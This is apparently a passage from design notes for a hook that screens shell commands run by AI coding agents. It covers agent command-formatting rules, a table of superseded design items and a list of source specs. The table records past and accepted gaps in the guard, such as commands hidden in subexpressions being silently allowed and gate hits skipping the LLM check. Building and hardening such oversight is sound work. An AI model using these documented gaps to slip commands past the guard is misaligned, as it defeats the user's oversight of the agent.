The hook's verdict is one-way (no feedback loop), so agents are taught
hook-friendly FORMS (canonical copy lives in the user's global CLAUDE.md):
R1 no heredocs (write files with the file tool) · R2 multi-line git messages =
repeated `-m` · R3 no `powershell.exe -Command` blobs · R4 no `cmd //c`
wrappers · R5 one quoting layer · R6 one command per line, short linear
pipelines · R7 known-gap commands run plainly and always prompt
(`python -c`, `powershell.exe -File`, some `adb` forms, interactive TUI).

Companion artifacts: `docs/agent-command-guidelines/` (guidance.md + skill +
install matrix). The gap-fill that accompanied the guidelines added config
entries for `gradlew`, `adb`, `unzip`, `javap`, `gh`, `net share`, `sc qc`,
`git worktree`, `git tag -a` (most now in the gated tier per §6).

---

## 11. Superseded / dropped design items (do NOT resurrect)

| Dropped item | Superseded by / why |
|---|---|
| `commands.json` runtime file, glob `patterns`, `dry_run_flags` | `config.json` with auto-anchored regex (2026-05-15 era) |
| `test-cases.adhoc.xml` | merged into the main suite; file deleted (test consolidation) |
| Exit code 2 for ask decisions | exit-code contract: ask ⇒ 0; 2 = fatal only (Claude Code ignores JSON on exit 2) |
| `tool_name_mapping` object form `{field, type}` | dot-path strings + `[*]` array walk |
| Domain-marker additions for `& {`, `@{`, `::`; VerbNounRegex anchor change | the AST-as-arbiter — markers were whack-a-mole; anchor change caused regressions (design-revision analysis §3.5) |
| Original `Test-SafeAst`: .NET calls blanket-safe; ScriptBlockAst blanket-unsafe | allowlisted .NET (instance name-only + static type-qualified); recursive scriptblock certification — the two critical safety holes |
| Resolver Step 0b "empty-RHS assignment ⇒ allow" patch | arbiter covers `$key='...'` via whole-line re-parse |
| Path entries inside trusted/untrusted_pattern (roots, traversal, system dirs) | retired by the path branch: `system_paths`/`editable_paths`/CWD + canonicalization (D3). Kept: legacy `trusted_stuff` scaffolding + the command-side untrusted exe pattern |
| `C:\git` as trusted root | CWD-only writability (path-branch D5) |
| Exe-guard on the WRITE side inside editable roots | location-only (path-branch D4); execution stays guarded command-side |
| `Invoke-Command` explicit read_only entry overriding `Invoke-*` verb | wrappers are unwrapped + arbitrated; the wrapper itself resolves unknown and is rescued by the arbiter when safe (current behavior — the old table row is gone from config) |
| Phase-I-only binary merge | attributed verdicts + suppression (P1–P5); binary kept only as the `attributed_verdicts:false` fallback |
| Phase-I testing workaround (`global_modifying_strictness: strict` to make local/LLM agree) | obsolete — suppression makes normal mode usable (only needed if `attributed_verdicts:false`) |
| Stage-1 always-safe guard (`Test-GatedInvocationSafe` stub) | stage-2 path-guard implemented (§8.7) |
| "G5 documented behavior: AST-wrapped gated commands veto" | fixed by tier stamp-back (§8.6) |
| trusted_pattern / untrusted_pattern LLM coverage | **dropped per user ruling 2026-08-02** — exception lists are normally empty; gate hits never reach the LLM (accepted bypass) |
| Using trusted_pattern to carve LLM-guard exceptions | rejected — whole-command gate bypasses decomposition AND redirect checks (H1/H2 class); exceptions live inside the guard's skip-list |
| Audit fixes H1–H6 (engine-side) | parked by user 2026-08-02; H1/H2 remediated in config (trusted_pattern cleanup, sign-off entry removed) |
| `git rev-parse` in strictness_gated | user moved it back to read_only 2026-08-02 (it is read-only) |
| dotnet DISALLOW list | rejected — unlisted methods already fail closed; the allowlist IS the gate (revisit only if wildcards are ever added) |
| `response_format` JSON-mode flags; self-consistency voting (n=3); parallel LLM launch; per-sub-command LLM calls | YAGNI (phase-I/II specs §12/§13) |
| Per-domain strictness for the path policy | path policy stays global (L4) |
| Positional per-cmdlet target-arg table for the stage-2 guard (options 1/3) | user rejected — interleaved flags break position maps; generic token scan chosen (§8.7) |
| Old file names: lowercase domains (`powershell`, `dos`), `test-cases.*` at repo root | domains are DOS_CMD/PowerShell/…; suites live under `test/config/live/` |
| Pipe split restricted to powershell/linux/dos_cmd + paren-blind AWS flag strip (silent auto-allow of commands hidden in `( … )` subexpressions or non-shell pipeline tails) | fixed 2026-08-02 (all-domain pipe split + paren-group extraction + `(`-guard; Decomp-ParenPipeline group pins it) |

---

## 12. Source documents (history — read for rationale only)

`docs/superpowers/specs/`:
2026-05-15-architecture-design · 2026-05-15-complex-command-test-cases-design ·
2026-06-06-var-assignment-design · 2026-06-06-redirect-strictness-design ·
2026-06-15-codex-cli-support-design ·
2026-07-13-parameter-commands-and-editable-paths-design ·
2026-07-18-ast-aware-safe-expressions-design · 2026-07-18-design-revision-analysis ·
2026-07-19-agent-command-guidelines-design · 2026-07-25-path-branch-design ·
2026-07-25-strictness-gated-design · 2026-08-01-llm-second-opinion-design ·
2026-08-02-llm-second-opinion-phase2-design · 2026-08-02-llm-second-opinion-phase3-design

Execution plans live in `docs/superpowers/plans/` (matching dates).
Audit reports: `docs/finding_1.md` (engine holes H1–H6), `docs/finding_2.md`
(per-case proof-read), `docs/tier-precedence-analysis.md` (read-only-vs-
modifying overlap; Option A spike, decision pending).
Config reference: `docs/config-json-guide.md`. Progress log: `PROGRESS.md`.
